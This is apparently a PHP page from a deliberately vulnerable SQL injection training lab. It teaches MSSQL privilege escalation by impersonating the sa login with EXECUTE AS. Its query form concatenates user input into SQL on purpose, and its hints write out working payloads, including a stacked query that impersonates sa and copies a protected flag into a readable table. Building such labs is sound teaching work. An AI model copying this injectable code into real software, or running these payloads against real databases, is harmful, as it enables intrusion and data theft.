<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        // Lab 14 uses low-privilege user; need EXECUTE AS to read flags
        try {
            $stmt = $conn->query("EXECUTE AS LOGIN = 'sa'; SELECT TOP 1 flag FROM flags; REVERT;");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab14_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab14", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 14. Impersonation: EXECUTE AS</h3>

    <h4>Scenario</h4>
    <p>
        A data warehouse application uses a <strong>low-privilege</strong> database account
        (<code>lab14_web_user</code>). This account can read <code>notes</code> but has
        <strong>SELECT denied</strong> on the <code>flags</code> table. However, it has been
        granted the <code>IMPERSONATE</code> permission on the <code>sa</code> login.
    </p>
    <p>
        Using <code>EXECUTE AS LOGIN = 'sa'</code>, the web user can escalate privileges
        to sysadmin level, bypassing the DENY on flags. After reading the flag, use
        <code>REVERT</code> to return to the original security context.
    </p>

    <h4>Objective</h4>
    <p>
        Attempting to read flags directly returns <strong>"SELECT permission was denied"</strong>.
        Use <strong>EXECUTE AS</strong> to impersonate <code>sa</code> and extract the flag.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Check current user: <code>1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -</code><br>
        2. Direct flag access is denied: <code>1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code><br>
        3. Discover IMPERSONATE: query <code>sys.server_permissions WHERE permission_name='IMPERSONATE'</code><br>
        4. Escalate + write: <code>1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -</code><br>
        5. Read the flag: query note 1 to see the flag written there
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab14_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You escalated privileges using EXECUTE AS and extracted the restricted flag.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Data Warehouse Query</h4>
    <form method="POST" class="form-row">
<input type="text" name="id" class="input" placeholder="Record ID (try: 1)" value="<?= htmlspecialchars($_POST['id'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Lookup</button>
    </form>
</div>

<?php
if (isset($_POST['id'])) {
    $id = $_POST['id'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, title, content FROM notes WHERE id = '$id'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No record found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['title'] ?? '') . '</strong><br>';
                    echo htmlspecialchars($row['content'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-error result-box">';
        echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
        echo '</div>';
    }
}
?>

<?php endif; ?>
